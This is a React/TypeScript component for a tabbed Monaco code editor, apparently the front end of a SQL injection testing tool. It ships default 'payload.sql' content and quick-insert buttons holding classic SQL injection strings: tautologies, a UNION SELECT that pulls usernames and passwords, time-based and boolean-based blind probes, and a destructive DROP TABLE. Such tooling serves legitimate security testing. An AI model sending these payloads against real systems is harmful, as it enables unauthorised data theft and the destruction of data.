import React, { useState, useRef, useCallback } from 'react';
import { Editor } from '@monaco-editor/react';
import type * as Monaco from 'monaco-editor';
import { Island } from '../ui/Island.js';
import { useTheme } from '../../hooks/useTheme.js';
import { useAnimation } from '../../hooks/useAnimation.js';
import Button from '../ui/Button.js';
import './EditorIsland.css';

export interface EditorTab {
  id: string;
  name: string;
  language: string;
  content: string;
  isDirty?: boolean;
}

export interface EditorIslandProps {
  className?: string;
  onExecute?: (content: string, language: string) => void;
  initialTabs?: EditorTab[];
}

const EditorIsland: React.FC<EditorIslandProps> = ({
  className = '',
  onExecute,
  initialTabs = [
    {
      id: 'sql-1',
      name: 'payload.sql',
      language: 'sql',
      content: `-- Basic SQL injection payloads
' OR '1'='1
' OR 1=1 --
' UNION SELECT null, username, password FROM users --
'; DROP TABLE users; --

-- Time-based blind injection
'; WAITFOR DELAY '00:00:05' --
' AND (SELECT COUNT(*) FROM sysobjects) > 0 WAITFOR DELAY '00:00:05' --

-- Boolean-based blind injection
' AND 1=1 --
' AND 1=2 --
' AND (SELECT SUBSTRING(@@version,1,1))='M' --`,
    },
  ],
}) => {
  const { resolvedTheme } = useTheme();
  const { reducedMotion } = useAnimation();
  const editorRef = useRef<any>(null);
  const [tabs, setTabs] = useState<EditorTab[]>(initialTabs);
  const [activeTabId, setActiveTabId] = useState<string>(initialTabs[0]?.id || '');
  const [isExecuting, setIsExecuting] = useState(false);

  const activeTab = tabs.find(tab => tab.id === activeTabId);

  // Common SQL injection payloads for quick insertion
  const commonPayloads = [
    {
      name: 'Basic OR',
      payload: "' OR '1'='1",
    },
    {
      name: 'Union Select',
      payload: "' UNION SELECT null, username, password FROM users --",
    },
    {
      name: 'Time Blind',
      payload: "'; WAITFOR DELAY '00:00:05' --",
    },
    {
      name: 'Boolean Blind',
      payload: "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    },
  ];

  // Handle editor content change
  const handleEditorChange = useCallback((value: string | undefined) => {
    if (!activeTab || value === undefined) return;

    setTabs(prevTabs =>
      prevTabs.map(tab =>
        tab.id === activeTabId
          ? { ...tab, content: value, isDirty: value !== initialTabs.find(t => t.id === tab.id)?.content }
          : tab
      )
    );
  }, [activeTabId, activeTab, initialTabs]);

  // Handle tab switching
  const handleTabSwitch = useCallback((tabId: string) => {
    setActiveTabId(tabId);
  }, []);

  // Handle tab closing
  const handleTabClose = useCallback((tabId: string) => {
    if (tabs.length <= 1) return; // Don't close the last tab

    const tabIndex = tabs.findIndex(tab => tab.id === tabId);
    const newTabs = tabs.filter(tab => tab.id !== tabId);
    setTabs(newTabs);

    // Switch to adjacent tab if closing active tab
    if (tabId === activeTabId) {
      const newActiveIndex = Math.min(tabIndex, newTabs.length - 1);
      setActiveTabId(newTabs[newActiveIndex]?.id || '');
    }
  }, [tabs, activeTabId]);

  // Handle adding new tab
  const handleAddTab = useCallback(() => {
    const newTab: EditorTab = {
      id: `tab-${Date.now()}`,
      name: `untitled-${tabs.length + 1}.sql`,
      language: 'sql',
      content: '-- New SQL payload\n',
    };
    setTabs(prevTabs => [...prevTabs, newTab]);
    setActiveTabId(newTab.id);
  }, [tabs.length]);

  // Handle payload execution
  const handleExecute = useCallback(() => {
    if (!activeTab || !onExecute) return;

    setIsExecuting(true);
    onExecute(activeTab.content, activeTab.language);
    setTimeout(() => setIsExecuting(false), 1000);
  }, [activeTab, onExecute]);

  // Handle quick payload insertion
  const handleInsertPayload = useCallback((payload: string) => {
    if (!editorRef.current) return;

    const editor = editorRef.current;
    const selection = editor.getSelection();
    const range = selection || {
      startLineNumber: 1,
      startColumn: 1,
      endLineNumber: 1,
      endColumn: 1,
    };

    editor.executeEdits('insert-payload', [
      {
        range,
        text: payload,
      },
    ]);

    editor.focus();
  }, []);

  // Handle editor mount
  const handleEditorDidMount = useCallback((editor: Monaco.editor.IStandaloneCodeEditor, monaco: typeof Monaco) => {
    editorRef.current = editor;

    // Add custom keyboard shortcuts
    editor.addCommand(monaco.KeyMod.CtrlCmd | monaco.KeyCode.Enter, () => {
      handleExecute();
    });

    // Focus the editor
    editor.focus();
  }, [handleExecute]);

  // Handle keyboard navigation for tabs
  const handleTabKeyDown = useCallback((event: React.KeyboardEvent, tabId: string) => {
    if (event.key === 'Enter' || event.key === ' ') {
      event.preventDefault();
      handleTabSwitch(tabId);
    } else if (event.key === 'Delete' || event.key === 'Backspace') {
      event.preventDefault();
      handleTabClose(tabId);
    }
  }, [handleTabSwitch, handleTabClose]);

  return (
    <div className={`editor-island-container ${className}`}>
      {/* Floating Toolbar Island */}
      <Island
        variant="secondary"
        elevation="medium"
        size="sm"
        className="editor-toolbar-island"
        appear={!reducedMotion}
      >
        <div className="editor-toolbar-content">
          {/* Quick Payload Buttons */}
          <div className="toolbar-section">
            <span className="toolbar-label">Quick Payloads:</span>
            <div className="payload-buttons">
              {commonPayloads.map((item, index) => (
                <Button
                  key={index}
                  variant="ghost"
                  size="sm"
                  onClick={() => handleInsertPayload(item.payload)}
                  className="payload-button"
                  title={`Insert: ${item.payload}`}
                >
                  {item.name}
                </Button>
              ))}
            </div>
          </div>

          {/* Execute Button */}
          <div className="toolbar-section">
            <Button
              onClick={handleExecute}
              disabled={!activeTab?.content.trim()}
              isLoading={isExecuting}
              size="sm"
              className="execute-button"
              title="Execute payload (Ctrl+Enter)"
            >
              Test Payload
            </Button>
          </div>
        </div>
      </Island>

      {/* Main Editor Island */}
      <Island
        variant="primary"
        elevation="low"
        size="lg"
        className="editor-main-island"
        appear={!reducedMotion}
      >
        {/* Tab System */}
        <div className="editor-tabs-container">
          <div className="editor-tabs" role="tablist">
            {tabs.map((tab) => (
              <div key={tab.id} className="editor-tab-container">
                <button
                  role="tab"
                  aria-selected={tab.id === activeTabId}
                  aria-controls={`editor-panel-${tab.id}`}
                  className={`editor-tab ${tab.id === activeTabId ? 'active' : ''} ${tab.isDirty ? 'dirty' : ''}`}
                  onClick={() => handleTabSwitch(tab.id)}
                  onKeyDown={(e) => handleTabKeyDown(e, tab.id)}
                  title={tab.isDirty ? `${tab.name} (modified)` : tab.name}
                >
                  <span className="tab-name">{tab.name}</span>
                  {tab.isDirty && <span className="dirty-indicator">●</span>}
                </button>
                {tabs.length > 1 && (
                  <button
                    className="tab-close-button"
                    onClick={() => handleTabClose(tab.id)}
                    title="Close tab"
                    aria-label={`Close ${tab.name}`}
                  >
                    ×
                  </button>
                )}
              </div>
            ))}
            <button
              className="add-tab-button"
              onClick={handleAddTab}
              title="Add new tab"
              aria-label="Add new tab"
            >
              +
            </button>
          </div>
        </div>

        {/* Editor Content */}
        <div className="editor-content-container">
          {activeTab && (
            <div
              id={`editor-panel-${activeTab.id}`}
              role="tabpanel"
              aria-labelledby={`tab-${activeTab.id}`}
              className="editor-panel"
            >
              <div className="monaco-editor-wrapper">
                <Editor
                  height="400px"
                  language={activeTab.language}
                  value={activeTab.content}
                  onChange={handleEditorChange}
                  onMount={handleEditorDidMount}
                  theme={resolvedTheme === 'dark' ? 'vs-dark' : 'vs'}
                  options={{
                    minimap: { enabled: false },
                    scrollBeyondLastLine: false,
                    fontSize: 14,
                    fontFamily: 'JetBrains Mono, Consolas, Monaco, monospace',
                    wordWrap: 'on',
                    automaticLayout: true,
                    suggestOnTriggerCharacters: true,
                    quickSuggestions: true,
                    folding: true,
                    lineNumbers: 'on',
                    renderWhitespace: 'selection',
                    tabSize: 2,
                    insertSpaces: true,
                    detectIndentation: false,
                    roundedSelection: false,
                    scrollbar: {
                      vertical: 'visible',
                      horizontal: 'visible',
                      useShadows: false,
                      verticalHasArrows: false,
                      horizontalHasArrows: false,
                    },
                    overviewRulerBorder: false,
                    hideCursorInOverviewRuler: true,
                    contextmenu: true,
                    mouseWheelZoom: true,
                    accessibilitySupport: 'auto',
                  }}
                />
              </div>
            </div>
          )}
        </div>

        {/* Editor Status Bar */}
        <div className="editor-status-bar">
          <div className="status-left">
            <span className="status-item">
              Language: {activeTab?.language.toUpperCase()}
            </span>
            <span className="status-item">
              Lines: {activeTab?.content.split('\n').length || 0}
            </span>
            <span className="status-item">
              Characters: {activeTab?.content.length || 0}
            </span>
          </div>
          <div className="status-right">
            <span className="status-item">
              Tab: {tabs.findIndex(tab => tab.id === activeTabId) + 1} of {tabs.length}
            </span>
          </div>
        </div>
      </Island>
    </div>
  );
};

export default EditorIsland;